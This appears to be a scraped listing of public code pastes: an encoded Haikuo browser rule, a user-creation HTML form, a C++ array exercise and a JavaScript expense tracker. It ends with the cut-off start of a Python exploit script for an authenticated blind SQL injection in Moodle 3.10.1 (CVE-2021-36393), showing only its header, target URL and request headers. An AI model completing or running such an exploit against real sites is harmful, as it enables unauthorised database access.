ICAgICB0ZXN0KHVybCwgaHRtbCwgZCwgb2xkLCBrZXksIHJ1bGUpO1xcXFxuICAgIH0gZWxzZSB7XFxcXG4gICAgICAgIC8v6Ieq5Yqo6K+G5YircG9zdOivt+axglxcXFxuICAgICAgICBodG1sID0gcmVxdWVzdCh1cmwpO1xcXFxuICAgICAgICBsZXQgZm9ybSA9IHBkZmgoaHRtbCwgXFxcXFxcXCJib2R5JiZmb3JtJiZIdG1sXFxcXFxcXCIpO1xcXFxuICAgICAgICBsZXQgYWN0aW9uID0gcGQoaHRtbCwgXFxcXFxcXCJmb3JtJiZhY3Rpb25cXFxcXFxcIiwgdXJsKTtcXFxcbiAgICAgICAgbGV0IGlucHV0cyA9IHBkZmEoaHRtbCwgXFxcXFxcXCJib2R5JiZmb3JtJiZpbnB1dFxcXFxcXFwiKTtcXFxcbiAgICAgICAgbGV0IGJvZHkgPSB7fTtcXFxcbiAgICAgICAgZm9yIChsZXQgaXQgb2YgaW5wdXRzKSB7XFxcXG4gICAgICAgICAgICBsZXQgbmFtZSA9IHBkZmgoaXQsIFxcXFxcXFwiaW5wdXQmJm5hbWVcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICBpZiAobmFtZSAmJiBuYW1lICE9IFxcXFxcXFwiXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgdmFsdWUgPSBwZGZoKGl0LCBcXFxcXFxcImlucHV0JiZ2YWx1ZVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICBib2R5W25hbWVdID0gdmFsdWUgfHwga2V5O1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGh0bWwgPSBwb3N0KGFjdGlvbiwge1xcXFxuICAgICAgICAgICAgYm9keTogYm9keVxcXFxuICAgICAgICB9KTtcXFxcbiAgICB9XFxcXG5cXFxcbiAgICBsZXQgYWxpc3QgPSBwZGZhKGh0bWwsIFxcXFxcXFwiYm9keSYmYVxcXFxcXFwiKTtcXFxcbiAgICBsZXQgYXJyID0gYWxpc3QubWFwKGl0ID0+IHtcXFxcbiAgICAgICAgbGV0IHQgPSBwZGZoKGl0LCBcXFxcXFxcImEmJlRleHRcXFxcXFxcIik7XFxcXG4gICAgICAgIGxldCB0MiA9IHBkZmgoaXQsIFxcXFxcXFwiYSYmdGl0bGVcXFxcXFxcIik7XFxcXG4gICAgICAgIHJldHVybiB7XFxcXG4gICAgICAgICAgICAvL2h0bWw6IGl0LFxcXFxuICAgICAgICAgICAgdGV4dDogdDIgJiYgdDIuaW5jbHVkZXMoa2V5KSA/IHQyIDogdCxcXFxcbiAgICAgICAgICAgIGhyZWY6IHBkKGl0LCBcXFxcXFxcImEmJmhyZWZcXFxcXFxcIiwgdXJsKVxcXFxuICAgICAgICB9XFxcXG4gICAgfSk7XFxcXG5cXFxcbiAgICBmdW5jdGlvbiBpc1Jlc3VsdChpdCkge1xcXFxuICAgICAgICBpdCA9IGl0LnRleHQgfHwgXFxcXFxcXCJcXFxcXFxcIjtcXFxcbiAgICAgICAgaWYgKGl0ID09IFxcXFxcXFwiXFxcXFxcXCIgfHwgaXQubWF0Y2goL+aQnOe0onznu5PmnpwvKSkge1xcXFxuICAgICAgICAgICAgcmV0dXJuIGZhbHNlXFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgcmV0dXJuIGl0LnRvTG93ZXJDYXNlKCkuaW5jbHVkZXMoa2V5KTtcXFxcbiAgICB9XFxcXG4gICAga2V5ID0ga2V5LnRvTG93ZXJDYXNlKCk7XFxcXG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCBhcnIubGVuZ3RoOyBpKyspIHtcXFxcbiAgICAgICAgbGV0IGl0ID0gYXJyW2ldO1xcXFxuICAgICAgICBsZXQgdCA9IGl0LnRleHQ7XFxcXG4gICAgICAgIGlmICghaXQuaHJlZiB8fCBpdC5ocmVmID09IFxcXFxcXFwiXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgIGNvbnRpbnVlO1xcXFxuICAgICAgICB9XFxcXG4gICAgICAgIGlmIChpc1Jlc3VsdChpdCkpIHtcXFxcbiAgICAgICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6IHQsXFxcXG4gICAgICAgICAgICAgICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vcGFnZS9wP3U9XFxcXFxcXCIgKyBiYXNlNjRFbmNvZGUoaXQuaHJlZiksXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8xXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgZGVzYzogXFxcXFxcXCLigJzigJzigJ3igJ08Zm9udCBjb2xvcj0jZjEzYjY2YT5cXFxcXFxcIiArIHJ1bGUgKyBcXFxcXFxcIjwvZm9udD5cXFxcXFxcIlxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9XFxcXG4gICAgcmV0dXJuIGQ7XFxcXG59XFxcXG4kLmV4cG9ydHMgPSBzZWFyY2g7XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi5aKe5YigXFxcIixcXFwicGF0aFxcXCI6XFxcIm1hbmFnZVxcXCIsXFxcInJ1bGVcXFwiOlxcXCIkLmV4cG9ydHMgPSBmdW5jdGlvbihkLCBuYW1lcykge1xcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIkFJ5oqA5pyvXFxcXFxcXCIsXFxcXG4gICAgICAgIHVybDogXFxcXFxcXCJjb25maXJtOi8v5Z+65LqOQUnor4bniYfoh6rliqjliIbmnpDmupDnoIHmioDmnK/vvIzku6PnoIHlrozlhajlvIDmupDvvIzmlbDmja7mnaXmupDkuo7ljp/nvZHnq5nvvIzova/ku7blkozop4TliJnkuI3mj5Dkvpvku7vkvZXlhoXlrrkuanM6JydcXFxcXFxcIixcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiZmxleF9idXR0b25cXFxcXFxcIlxcXFxuICAgIH0pO1xcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIiArIFxcXFxcXFwiLFxcXFxuICAgICAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgocnIpID0+IHtcXFxcbiAgICAgICAgICAgIGRlbGV0ZUl0ZW1CeUNscyhcXFxcXFxcImFpYWRkXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgYWRkSXRlbUFmdGVyKHJyICsgXFxcXFxcXCJhaXNkZWxcXFxcXFxcIiwgW3tcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwiXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIGRlc2M6IFxcXFxcXFwi6K+36L6T5YWl572R56uZ5ZCN56ewXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImlucHV0XFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZVZpc2libGU6IGZhbHNlLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgb25DaGFuZ2U6IFxcXFxcXFwicHV0TXlWYXIoJ25hbWUnLCBpbnB1dClcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGNsczogXFxcXFxcXCJhaWFkZFxcXFxcXFwiXFxcXG4gICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICB9LFxcXFxuICAgICAgICAgICAgICAgIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwiXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIGRlc2M6IFxcXFxcXFwi6K+36L6T5YWl572R56uZ5pCc57Si5Zyw5Z2AXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImlucHV0XFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZVZpc2libGU6IGZhbHNlLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgb25DaGFuZ2U6IFxcXFxcXFwicHV0TXlWYXIoJ3N1cmwnLCBpbnB1dClcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGNsczogXFxcXFxcXCJhaWFkZFxcXFxcXFwiXFxcXG4gICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICB9LFxcXFxuICAgICAgICAgICAgICAgIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi5o+Q5Lqk5L+d5a2YXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfY2VudGVyXzFcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgdXJsOiAkKFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoKCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHN1cmwgPSBnZXRNeVZhcihcXFxcXFxcInN1cmxcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgbmFtZSA9IGdldE15VmFyKFxcXFxcXFwibmFtZVxcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzdXJsID09IFxcXFxcXFwiXFxcXFxcXCIgfHwgbmFtZSA9PSBcXFxcXFxcIlxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/or7fovpPlhaXlrozmlbTlhoXlrrlcXFxcXFxcIlxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHIgPSBkZWNvZGVVUklDb21wb25lbnQoc3VybCk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICByID0gci5yZXBsYWNlKG5ldyBSZWdFeHAoXFxcXFxcXCJbXFxcXFxcXFx1NGUwMC1cXFxcXFxcXHU5ZmE1XStcXFxcXFxcIiwgXFxcXFxcXCJnXFxcXFxcXCIpLCBcXFxcXFxcIioqXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhZGRSdWxlXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9ID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL2RhdGFcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBhZGRSdWxlKG5hbWUsIHIpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5bey5L+d5a2YXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgICAgIH0pLFxcXFxuICAgICAgICAgICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgY2xzOiBcXFxcXFxcImFpYWRkXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIF0pO1xcXFxuICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiXFxcXG4gICAgICAgIH0sIE1ZX1JVTEUudGl0bGUpLFxcXFxuICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJmbGV4X2J1dHRvblxcXFxcXFwiLFxcXFxuICAgIH0pO1xcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBcXFxcXFxcIiAtIFxcXFxcXFwiLFxcXFxuICAgICAgICB1cmw6IFxcXFxcXFwic2VsZWN0Oi8vXFxcXFxcXCIgKyBKU09OLnN0cmluZ2lmeSh7XFxcXG4gICAgICAgICAgICBvcHRpb25zOiBuYW1lcyxcXFxcbiAgICAgICAgICAgIHRpdGxlOiBcXFxcXFxcIuivt+mAieaLqeimgeWIoOmZpOeahOermeeCuVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAganM6ICQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgIGxldCB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJlbW92ZVJ1bGVcXFxcbiAgICAgICAgICAgICAgICB9ID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL2RhdGFcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgcmVtb3ZlUnVsZShpbnB1dCk7XFxcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL09LXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICB9KVxcXFxuICAgICAgICB9KSxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiZmxleF9idXR0b25cXFxcXFxcIixcXFxcbiAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgIGlkOiBNWV9SVUxFLnRpdGxlICsgXFxcXFxcXCJhaXNkZWxcXFxcXFxcIlxcXFxuICAgICAgICB9XFxcXG4gICAgfSk7XFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiYmxhbmtfYmxvY2tcXFxcXFxcIlxcXFxuICAgIH0pO1xcXFxuXFxcXG59XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi6aqM6K+B56CBXFxcIixcXFwicGF0aFxcXCI6XFxcInl6bVxcXCIsXFxcInJ1bGVcXFwiOlxcXCJmdW5jdGlvbiBjaGVjayh1cmwsIGh0bWwsIGQpIHtcXFxcbiAgICBsZXQgcmVsb2FkID0gZmFsc2U7XFxcXG4gICAgcmV0dXJuIHJlbG9hZDtcXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gdGVzdCh1cmwsIGh0bWwsIGQsIG9sZCwga2V5LCBydWxlKSB7XFxcXG4gICAgaWYgKC8156eSfOmikee5gS8udGVzdChodG1sKSkge1xcXFxuICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgdGl0bGU6ICfmkJzntKLpnIDpl7TpmpQ156eS77yM54K55Ye76YeN5paw5Yqg6L29JyxcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInRleHRfMVxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgZGVzYzogXFxcXFxcXCLigJzigJzigJ3igJ08Zm9udCBjb2xvcj0jZjEzYjY2YT5cXFxcXFxcIiArIHJ1bGUgKyBcXFxcXFxcIjwvZm9udD5cXFxcXFxcIixcXFxcbiAgICAgICAgICAgIHVybDogJCgpLmxhenlSdWxlKCh1cmwsIG9sZCwga2V5LCBydWxlKSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHNwID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL3NwXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgIGxldCBkID0gc3Aob2xkLCBrZXksIHJ1bGUpO1xcXFxuICAgICAgICAgICAgICAgIGxldCB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHdyYXBcXFxcbiAgICAgICAgICAgICAgICB9ID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9wYWdlL3Rvb2xcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgZm9yIChsZXQgaXQgb2YgZCkge1xcXFxuICAgICAgICAgICAgICAgICAgICBpdC50aXRsZSA9IHdyYXAoaXQudGl0bGUsIGtleSk7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIGFkZEl0ZW1BZnRlcih1cmwsIGQpO1xcXFxuICAgICAgICAgICAgICAgIGRlbGV0ZUl0ZW0odXJsKTtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJ0b2FzdDovL09LXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICB9LCB1cmwsIG9sZCwga2V5LCBydWxlKSxcXFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgaWQ6IHVybFxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICB9KTtcXFxcbiAgICB9XFxcXG59XFxcXG5cXFxcbiQuZXhwb3J0cyA9IHtcXFxcbiAgICBjaGVjazogY2hlY2ssXFxcXG4gICAgdGVzdDogdGVzdFxcXFxufVxcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuW3peWFt1xcXCIsXFxcInBhdGhcXFwiOlxcXCJ0b29sXFxcIixcXFwicnVsZVxcXCI6XFxcImZ1bmN0aW9uIHdyYXAodGV4dCwgcykge1xcXFxuICAgIHJldHVybiB0ZXh0LmluY2x1ZGVzKFxcXFxcXFwi4oCc4oCc4oCd4oCdXFxcXFxcXCIpID8gdGV4dCA6IFxcXFxcXFwi4oCc4oCc4oCd4oCdXFxcXFxcXCIgKyB0ZXh0LnJlcGxhY2UobmV3IFJlZ0V4cChcXFxcXFxcIjxlbT58PC9lbT5cXFxcXFxcIiwgXFxcXFxcXCJnXFxcXFxcXCIpLCBcXFxcXFxcIlxcXFxcXFwiKS5yZXBsYWNlKG5ldyBSZWdFeHAocywgXFxcXFxcXCJnXFxcXFxcXCIpLCBcXFxcXFxcIjxzdHJvbmc+PHNwYW4gc3R5bGU9XFxcXFxcXFxcXFxcXFxcImNvbG9yOiAjMUU5MEZGXFxcXFxcXFxcXFxcXFxcIj5cXFxcXFxcIiArIHMgKyBcXFxcXFxcIjwvc3Bhbj48L3N0cm9uZz5cXFxcXFxcIilcXFxcbn1cXFxcbiQuZXhwb3J0cyA9IHtcXFxcbiAgICB3cmFwOiB3cmFwXFxcXG59XFxcIn0se1xcXCJjb2xfdHlwZVxcXCI6XFxcIm1vdmllXzNcXFwiLFxcXCJuYW1lXFxcIjpcXFwi5Y2V5pCcXFxcIixcXFwicGF0aFxcXCI6XFxcInNpbmdsZXNcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG52YXIgZCA9IFtdO1xcXFxuZC5wdXNoKHtcXFxcbiAgICB0aXRsZTogXFxcXFxcXCLmkJzntKJcXFxcXFxcIixcXFxcbiAgICB1cmw6ICQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgICAgICBwdXRNeVZhcihcXFxcXFxcInNvXFxcXFxcXCIsIGlucHV0KTtcXFxcbiAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICB9KSxcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJpbnB1dFxcXFxcXFwiLFxcXFxuICAgIGRlc2M6IFxcXFxcXFwi6K+36L6T5YWl5YWz6ZSu6K+N77yM5bC96YeP5bCR5a2X5LiN6KaB5aSa5a2XXFxcXFxcXCIsXFxcXG4gICAgcGljX3VybDogXFxcXFxcXCJcXFxcXFxcIixcXFxcbiAgICBleHRyYToge1xcXFxuICAgICAgICBkZWZhdWx0VmFsdWU6IGdldE15VmFyKFxcXFxcXFwic29cXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIilcXFxcbiAgICB9XFxcXG59KTtcXFxcbmxldCBzID0gZ2V0TXlWYXIoXFxcXFxcXCJzb1xcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbmxldCByID0gXFxcXFxcXCJcXFxcXFxcIjtcXFxcbmlmIChzICE9IFxcXFxcXFwiXFxcXFxcXCIpIHtcXFxcbiAgICBsZXQgcCA9IE1ZX1BBR0U7XFxcXG4gICAgbGV0IHtcXFxcbiAgICAgICAgbG9hZFxcXFxuICAgIH0gPSAkLnJlcXVpcmUoXFxcXFxcXCJoaWtlcjovL3BhZ2UvZGF0YVxcXFxcXFwiKTtcXFxcbiAgICBsZXQge1xcXFxuICAgICAgICB3cmFwXFxcXG4gICAgfSA9ICQucmVxdWlyZShcXFxcXFxcImhpa2VyOi8vcGFnZS90b29sXFxcXFxcXCIpO1xcXFxuICAgIGxldCBkYXRhID0gbG9hZChwLCBNWV9QQVJBTVMuUlVMRS5uYW1lKTtcXFxcbiAgICBsZXQgYXJyID0gZGF0YVswXS5maW5kKHMsIHApO1xcXFxuICAgIGZvciAobGV0IGl0IG9mIGFycikge1xcXFxuICAgICAgICBpdC50aXRsZSA9IHdyYXAoaXQudGl0bGUsIHMpXFxcXG4gICAgICAgIGQucHVzaChpdCk7XFxcXG4gICAgfVxcXFxufVxcXFxuc2V0UmVzdWx0KGQpO1xcXCJ9LHtcXFwiY29sX3R5cGVcXFwiOlxcXCJtb3ZpZV8zXFxcIixcXFwibmFtZVxcXCI6XFxcIuaQnOe0oumhtemdolxcXCIsXFxcInBhdGhcXFwiOlxcXCJzb3VwXFxcIixcXFwicnVsZVxcXCI6XFxcImpzOlxcXFxudmFyIGQgPSBbXTtcXFxcbmlmIChNWV9QQVJBTVMua2V5ICYmIGdldE15VmFyKFxcXFxcXFwidXNlXFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXCIpID09IFxcXFxcXFwiXFxcXFxcXCIpIHtcXFxcbiAgICBwdXRNeVZhcihcXFxcXFxcInNvdVxcXFxcXFwiLCBNWV9QQVJBTVMua2V5KTtcXFxcbiAgICBwdXRNeVZhcihcXFxcXFxcInVzZVxcXFxcXFwiLCBcXFxcXFxcIjFcXFxcXFxcIik7XFxcXG4gICAgYWRkTGlzdGVuZXIoXFxcXFxcXCJvbkNsb3NlXFxcXFxcXCIsICQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgICAgICBjbGVhck15VmFyKFxcXFxcXFwidXNlXFxcXFxcXCIpO1xcXFxuICAgIH0pKTtcXFxcbn1cXFxcbiQucmVxdWlyZSgnaGlrZXI6Ly9wYWdlL3BybycpXFxcIn1dXCJ9IiwidGl0bGUiOiLwn5SlaTPnu7zlkIjnpL7ljLrwn5SlIn0=
vZMMsX73,邀您一起看：2024年2月推荐,xiaomianao666,JavaScript,Saturday 13th of April 2024 12:13:21 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥2024年2月推荐@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi5aWH5aaZ5bel5YW3566xXCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9lbXB0eVwiLFwiY29sX3R5cGVcIjpcIng1X3dlYnZpZXdfc2luZ2xlXCIsXCJmaW5kX3J1bGVcIjpcImpzOnNldFJlc3VsdChbe1xcbiAgICB1cmw6XFxcImh0dHBzOi8vaGFpa3Vvc2hpamllLmNuL2FyY2hpdmVzLzIwMjRuaWFuLTJ5dWUtdHVpLWppYW5cXFwiLFxcbmRlc2M6XFxcIjEwMCUmJmZsb2F0XFxcIixcXG5leHRyYTp7Y2FuQmFjazogdHJ1ZX1cXG59XSk7XCIsXCJncm91cFwiOlwi5bel5YW3XCIsXCJwYWdlc1wiOlwiW11cIn0iLCJ0aXRsZSI6IjIwMjTlubQy5pyI5o6o6I2QIn0=
e0DTAWpQ,Loginhtml,GZTEAM,HTML,Saturday 13th of April 2024 12:08:18 AM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Crear Nuevo Usuario</title>
    <link rel=""stylesheet"" href=""styles.css""> <!-- Agregar esta línea para vincular el archivo CSS externo -->
</head>
<body>
    <h1>Create username : </h1>
    <form action=""/login"" method=""post"">
        <input type=""text"" name=""username"" required />
        <button type=""submit"">Crear usuario</button>
    </form>
</body>
</html>
"
svqBSQv8,Untitled,35657,C++,Friday 12th of April 2024 11:52:41 PM CDT,"#include <iostream> 

using namespace std;

void print(int* arr, int size) {
    for (int i = 0; i < size; i++) {
        cout << arr[i] << "" "";
    }
    cout << endl;
}

void fill(int* arr, int size) {
    for (int i = 0; i < size; i++) {
        arr[i] = rand() % 10;
    }
}

int main() {
    setlocale(LC_ALL, ""ru"");

    srand(time(NULL));

    int size, type;

    cout << ""Введите размер массива: "";
    cin >> size;
    
    cout << ""Введите 0 для удаления четных элементов, 1 для удаления нечетных элементов: "";
    cin >> type;

    int* arr = new int[size];

    fill(arr, size);
    print(arr, size);

    int temp_size = size % 2 != 0 && type == 0 ? size / 2 + 1 : size / 2;

    int* temp = new int[temp_size];

    for (int i = type, k = 0; i < size; i += 2, k++) {
        temp[k] = arr[i];
    }

    delete[] arr;

    arr = temp;

    size = temp_size;

    print(arr, size);

    delete[] temp;
}"
StHYZu5x,2.Expense Tracker,Silviya7,JavaScript,Friday 12th of April 2024 11:23:18 PM CDT,"
function solve(){
    const ElementExpense=document.getElementById('expense');
    const Elementamount=document.getElementById('amount');
    const Elementdate=document.getElementById('date');
    const BtnAdd=document.getElementById('add-btn');
    const elementUl= document.getElementById('preview-list');
    const expenseElement= document.getElementById('expenses-list');
    const BtnDelete= document.querySelector('.btn.delete');
    

    BtnDelete.addEventListener('click',()=>{
        expenseElement.innerHTML='';
    });

    BtnAdd.addEventListener('click',()=>{
       /* console.log(ElementExpense.value);
        console.log(Elementamount.value);
        console.log(Elementdate.value);*/
    
        if(!ElementExpense.value || !Elementamount.value || !Elementdate.value){
           return;
        }
       
        let firstp=document.createElement('p');
    
        firstp.textContent=`Type: ${ElementExpense.value}`;
        let secondp=document.createElement('p');
        secondp.textContent=`Amount: ${Elementamount.value}$`;
        let thirdp=document.createElement('p');
        thirdp.textContent=`Date: ${Elementdate.value}`;
    
        const ElementArticle= document.createElement('article');
        ElementArticle.appendChild(firstp);
        ElementArticle.appendChild(secondp);
        ElementArticle.appendChild(thirdp);
    
        const Elementli=document.createElement('li');   
        const DivBtns= document.createElement('div');
        DivBtns.classList.add('buttons');
        const btnedit=document.createElement('button');
        const btnok=document.createElement('button');
    
        btnedit.classList.add('btn','edit');
        btnedit.textContent='EDIT';
        btnok.classList.add('btn','ok');
        btnok.textContent='OK';
    
        DivBtns.appendChild(btnedit);
        DivBtns.appendChild(btnok);
        Elementli.classList.add('expense-item');
    
        Elementli.appendChild(ElementArticle);
        elementUl.appendChild(Elementli);
        Elementli.appendChild(DivBtns);
        
         ElementExpense.value='';
         Elementamount.value='';
         Elementdate.value='';
         BtnAdd.setAttribute('disabled','disabled');      

        btnedit.addEventListener('click',()=>{
           let ListNodes= document.querySelectorAll('article p');
           let AllList=Array.from(ListNodes);

           ElementExpense.value=AllList[0].textContent.substring(6);
           Elementamount.value=AllList[1].textContent.substring(8,AllList[1].textContent.length-1);
           Elementdate.value=AllList[2].textContent.substring(6);
           Elementli.remove();
           BtnAdd.removeAttribute('disabled');
        });

        btnok.addEventListener('click',()=>{         
            
            expenseElement.appendChild(Elementli);
            DivBtns.remove();
            BtnAdd.removeAttribute('disabled');
        });
       
});
}"
PH0ZarRP,"Moodle 3.10.1 - Authenticated Blind Time-Based SQL Injection - ""sort"" parameter",FlyFar,Python,Friday 12th of April 2024 10:38:13 PM CDT,"# Exploit Title: Moodle Authenticated Time-Based Blind SQL Injection - ""sort"" Parameter
# Google Dork: 
# Date: 04/11/2023
# Exploit Author: Julio Ángel Ferrari (Aka. T0X1Cx)
# Vendor Homepage: https://moodle.org/
# Software Link: 
# Version: 3.10.1
# Tested on: Linux
# CVE : CVE-2021-36393

import requests
import string
from termcolor import colored

# Request details
URL = ""http://127.0.0.1:8080/moodle/lib/ajax/service.php?sesskey=ZT0E6J0xWe&info=core_course_get_enrolled_courses_by_timeline_classification""
HEADERS = {
    ""Accept"": ""application/json, text/javascript, */*; q=0.01"",
    ""Content-Type"": ""application/json"",
    ""X-Requested-With"": ""XMLHttpRequest"",
    ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36"",
    ""Origin"": ""http://127.0.0.1:8080"",
    ""Referer"": ""http://127.0.0.1:8080/moodle/my/"",
    ""Accept-Encoding"": ""gzip, deflate"",
    ""Accept-Language"": ""en-US,en;q=0.9"",
